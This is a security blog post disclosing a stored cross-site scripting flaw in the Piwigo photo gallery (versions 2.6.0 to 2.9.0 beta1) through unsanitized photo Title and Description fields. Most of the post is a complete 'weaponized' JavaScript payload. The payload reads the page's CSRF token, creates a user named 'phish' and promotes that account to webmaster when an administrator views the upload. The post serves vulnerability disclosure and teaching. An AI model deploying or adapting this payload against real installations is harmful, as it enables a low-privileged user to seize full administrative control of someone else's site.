---
title: "Stored XSS in Piwigo 2.6.0 -> 2.9.0 beta1"
date: 2020-03-06
description: "A weaponized stored XSS example"
summary: "A weaponized stored XSS example"
tags: ["XSS","Piwigo"]
---

## Background

Back in October 2016 I reported a stored cross-site scripting (XSS) vulernability in the Piwigo photo gallery CMS to the maintainer. The `Title` and `Description` fields of uploaded photos are not being properly sanitized or escaped by the Community plugin or Piwigo Core before being reflected back in the application response.

![](/images/bugs/piwigo/xss1-1.png)

![](/images/bugs/piwigo/xss1-2.png)

## Privesc to Webmaster via Stored XSS

From an attackers perspective this stored XSS is great because a low privileged user can upload a photo which needs to be approved by an administrator. If the Community plugin is installed and enabled then non administrative users are able to exploit this vulnerability and execute arbitray code as an administrator. 

To weaponise this stored XSS, lets create two XHR requests:
- The first request will create a new user 
- The second request will promote the new user from a standard user account to a webmaster (highest privileges). 


```javascript
// grab the csrf token sent with each form submitted for creating users and updating their profiles
var csrf_token = $("input[name = pwg_token]").val();
// set username and password details
var username = "phish";
var password = "password123";
// set piwigo url
var piwigo_URL = "http://<target>";
// create a new XMLHttpRequest to create a new user
xhr = new XMLHttpRequest();
var create_User_URL = piwigo_URL+"/piwigo/ws.php?format=json&method=pwg.users.add";
xhr.open("POST", create_User_URL, true);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.onreadystatechange = function() {
	if (xhr.readyState == 4 && xhr.status == 200) {
		// retrieve user id that our newly created user was assigned
		var user_Details = JSON.parse(xhr.responseText);
		var user_ID = user_Details.result.users[0].id;
		// promote user privs to webmaster
		xhr2 = new XMLHttpRequest();
		var update_User_Priv_URL = piwigo_URL+"/piwigo/ws.php?format=json&method=pwg.users.setInfo";
		xhr2.open("POST", update_User_Priv_URL, true);
		xhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		var update_User_Priv = "user_id="+user_ID+"&email=&status=webmaster&level=0&enabled_high=on&nb_image_page=15&theme=elegant&language=en_GB&recent_period=7&pwg_token="+csrf_token+"&group_id=-1&expand=false&show_nb_hits=false&show_nb_comments=false";
		xhr2.send(update_User_Priv);
	}
}
var create_User = "username="+username+"&password="+password+"&email=&pwg_token="+csrf_token;
xhr.send(create_User);
```

Now when an administrator logs in and views the malicious upload, the stored XSS payload will trigger and we can login with our new webmaster account.